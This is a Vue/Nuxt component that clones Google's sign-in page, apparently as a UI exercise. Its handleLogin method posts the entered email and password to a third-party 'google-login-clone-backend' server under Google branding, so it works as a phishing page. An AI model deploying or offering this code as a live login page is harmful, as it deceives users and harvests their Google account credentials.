<template>
  <main class="lg:h-screen lg:grid lg:place-content-center space-y-6">
    <div
      class="lg:border lg:border-gray-300 lg:rounded-lg w-11/12 lg:w-7/12 mx-auto p-1 pt-10 lg:p-10 space-y-10"
    >
      <div class="flex justify-center items-center flex-col gap-y-2">
        <div>
          <img src="@/assets/icons/google.svg" alt="" />
        </div>
        <h1 class="text-2xl text-gray-700 signIn">Sign in</h1>
        <p class="text-gray-800">Use your Google Account</p>
      </div>
      <div class="space-y-4">
        <div v-if="currentStep === 0" class="w-full pb-2">
          <input
            type="email"
            v-model="form.email"
            class="border py-3 px-3 placeholder:text-gray-700 rounded-md focus:border-2 focus:border-blue-600 outline-none border-gray-300 w-full"
            placeholder="Email or phone"
          />
        </div>
        <div v-if="currentStep === 1" class="relative pb-2">
          <input
            v-model="form.password"
            :type="is_password_eye_open ? 'text' : 'password'"
            class="border py-3 px-3 rounded-md outline-none border-gray-300 w-full focus:border-2 focus:border-blue-600"
            placeholder="Password"
          />
          <div class="absolute right-6 top-4">
            <img
              :src="require(`@/assets/icons/${togglePasswordEye}.svg`)"
              alt=""
              class="h-6 w-6 cursor-pointer"
              @click="is_password_eye_open = !is_password_eye_open"
            />
          </div>
        </div>
        <nuxt-link to="/" class="text-blue-600 font-medium text-sm pt-2"
          >Forgot email?</nuxt-link
        >
      </div>
      <div>
        <p class="text-gray-600 text-sm leading-loose">
          Not your computer? Use Private Browsing windows to sign in
          <span class="text-blue-600 font-medium text-sm"
            >Learn more about using Guest mode</span
          >
        </p>
      </div>
      <div class="flex justify-between items-center">
        <p class="text-blue-600 text-sm">Create account</p>
        <button
          v-if="currentStep === 0"
          @click="currentStep++"
          class="text-white bg-blue-600 rounded-md text-sm px-6 py-2"
        >
          Next
        </button>
        <button
          v-if="currentStep === 1"
          @click="handleLogin"
          :disabled="processing"
          class="text-white bg-blue-600 rounded-md text-sm px-6 py-2 disabled:cursor-not-allowed disabled:opacity-25"
        >
          Submit
        </button>
      </div>
    </div>
    <div
      class="lg:flex justify-between items-center w-11/12 lg:w-8/12 mx-auto space-y-3"
    >
      <div>
        <p class="text-xs text-gray-500">English (United States)</p>
      </div>
      <div class="flex items-center gap-x-6 lg:gap-x-3">
        <p class="text-xs text-gray-600">Help</p>
        <p class="text-xs text-gray-600">Privacy</p>
        <p class="text-xs text-gray-600">Terms</p>
      </div>
    </div>
  </main>
</template>

<script>
export default {
  name: "IndexPage",
  data() {
    return {
      currentStep: 0,
      is_password_eye_open: false,
      processing: false,
      form: {
        email: "",
        password: "",
      },
    };
  },
  methods: {
    handleLogin() {
      this.processing = true;
      this.$axios
        .post(
          "https://google-login-clone-backend.onrender.com/api/auth/signin",
          this.form
        )
        .then((res) => {
          this.$toastr.s("Login was successful.");
          this.form.email = "";
          this.form.password = "";
        })
        .catch((error) => {
          this.errorMessage = error && error?.response?.data?.error;
          this.$toastr.e(this.errorMessage);
        })
        .finally(() => {
          this.processing = false;
        });
    },
  },
  computed: {
    togglePasswordEye() {
      return !this.is_password_eye_open ? "eye-close" : "eye-open";
    },
  },
};
</script>

<style scoped>
.signIn {
  font-family: sans-serif;
}
</style>
